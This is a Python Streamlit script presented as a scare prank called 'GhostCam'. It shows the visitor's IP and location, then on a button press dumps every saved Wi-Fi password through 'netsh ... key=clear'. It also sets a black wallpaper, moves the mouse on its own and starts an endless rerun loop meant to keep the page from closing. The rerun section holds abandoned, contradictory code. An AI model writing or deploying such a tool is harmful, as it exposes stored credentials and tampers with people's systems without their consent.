import streamlit as st
import geocoder
import subprocess
import ctypes
import time
import os
import re
from PIL import Image
import pyautogui as pag
import random
import threading

# --- Streamlit Page Settings ---
st.set_page_config(page_title="👁️ GhostCam is Watching You", layout="centered")

# --- Creepy background style and flicker effect ---
st.markdown("""
<style>
body {
    background-color: black;
    color: crimson;
    font-family: 'Courier New', monospace;
}
.title {
    font-size: 48px;
    text-align: center;
    animation: flicker 2s infinite;
    margin-top: 20px;
}
@keyframes flicker {
    0%, 100% {opacity: 1;}
    50% {opacity: 0.3;}
}
</style>
""", unsafe_allow_html=True)

# Title
st.markdown("<div class='title'>👁️ GhostCam is Watching You...</div>", unsafe_allow_html=True)

# --- Fetch IP and Location Info ---
g = geocoder.ip('me')
location_data = g.geojson['features'][0]['properties'] if g and g.ok else {}
ip_address = g.ip if g and g.ok else None

# First Innocent Message
st.markdown("## 😎 Welcome! Nothing special here...")
st.markdown("### 🧐 Scroll down to see something crazy... 👀")
st.markdown("<br><br><br><br><br><br>", unsafe_allow_html=True)

# Surprise Section (IP and Location)
st.subheader("🎯 Surprise! Here's What We Found:")

if ip_address:
    st.success(f"**Your IP Address is:** `{ip_address}`")
else:
    st.error("❌ Could not retrieve your IP address.")

if location_data:
    st.write(f"**City:** {location_data.get('city', 'Unknown')}")
    st.write(f"**Region:** {location_data.get('region', 'Unknown')}")
    st.write(f"**Country:** {location_data.get('country', 'Unknown')}")
    st.write(f"**Latitude:** {location_data.get('lat', 'Unknown')}")
    st.write(f"**Longitude:** {location_data.get('lng', 'Unknown')}")
else:
    st.warning("Location details not available.")

# More Scroll Space
st.markdown("<br><br><br><br><br><br>", unsafe_allow_html=True)
st.markdown("### 📡 Scroll down to also see your Wi-Fi History...")

# Wi-Fi History Section
st.subheader("🔍 Your Wi-Fi History:")
try:
    result = subprocess.run(['netsh', 'wlan', 'show', 'profile'], capture_output=True, text=True)
    if result.stdout:
        st.write("Here are the saved Wi-Fi profiles on your system:")
        st.code(result.stdout)
    else:
        st.warning("No Wi-Fi profiles found or access denied.")
except Exception as e:
    st.error(f"❌ An error occurred while fetching Wi-Fi details: {e}")

# Scroll More
st.markdown("<br><br><br><br><br><br>", unsafe_allow_html=True)
st.markdown("### 🔥 Scroll down even more for the final surprise!")

# Mouse Prank Function
def mouse_prank_safe(duration=15):
    end_time = time.time() + duration
    while time.time() < end_time:
        x = random.randint(600, 700)
        y = random.randint(200, 600)
        pag.moveTo(x, y, duration=0.5)

# Final Shock Button
if st.button("👻 Click Here for the Final Shock!", key="final_shock_button"):
    st.subheader("🔐 Saved Wi-Fi Profiles & Passwords:")

    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles_output = result.stdout
        profiles = re.findall(r"All User Profile\s*:\s(.*)", profiles_output)

        if profiles:
            for profile in profiles:
                profile = profile.strip()
                password_result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                    capture_output=True, text=True
                )
                password_output = password_result.stdout
                password_search = re.search(r"Key Content\s*:\s(.*)", password_output)
                password = password_search.group(1) if password_search else "🔒 Not Found / Secured"
                st.write(f"📶 **{profile}** — 🔑 `{password}`")
        else:
            st.warning("No Wi-Fi profiles found.")
    except Exception as e:
        st.error(f"❌ Something went wrong while fetching Wi-Fi passwords: {e}")

    # Wallpaper Change
    try:
        black_wallpaper_path = os.path.join(os.getcwd(), "black.jpg")
        if not os.path.exists(black_wallpaper_path):
            black_img = Image.new('RGB', (1920, 1080), color=(0, 0, 0))
            black_img.save(black_wallpaper_path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, black_wallpaper_path, 3)
    except Exception as e:
        st.warning(f"⚠️ Could not change wallpaper: {e}")

    # Ghost Flicker Placeholder
    try:
        st.markdown("### 👁️ Screen glitch initiated...")
        for i in range(3):
            st.markdown(f"👻 Flicker {i+1}")
            time.sleep(1.2)
    except Exception as e:
        st.error(f"💀 Visual effect failed: {e}")

    # Mouse Movement Prank
    try:
        st.markdown("### 🖱️ Your mouse has been possessed... 😈")
        prank_thread = threading.Thread(target=mouse_prank_safe)
        prank_thread.start()
    except Exception as e:
        st.error(f"❌ Mouse prank failed: {e}")

# Keep the app alive forever by repeatedly rerunning itself every 30 seconds
# This creates a never-ending spooky vibe — page will never fully close

def keep_alive():
    while True:
        time.sleep(30)
        st.experimental_rerun()

# Run the keep_alive in a thread (optional, Streamlit may need user interaction to rerun)
# Commented out because st.experimental_rerun inside a thread can cause issues.
# Instead, use a hidden button trick below.

# --- Hidden button to force rerun every 30 seconds ---
import threading

def periodic_rerun():
    while True:
        time.sleep(30)
        try:
            # This won't work perfectly due to Streamlit session limitations, but better than nothing
            st.experimental_rerun()
        except:
            pass

# Instead, we do this:

if 'rerun' not in st.session_state:
    st.session_state.rerun = 0

if st.session_state.rerun < 1000000:
    st.session_state.rerun += 1
    st.experimental_rerun()

# (This will keep refreshing the app repeatedly, creating the "never close" effect)

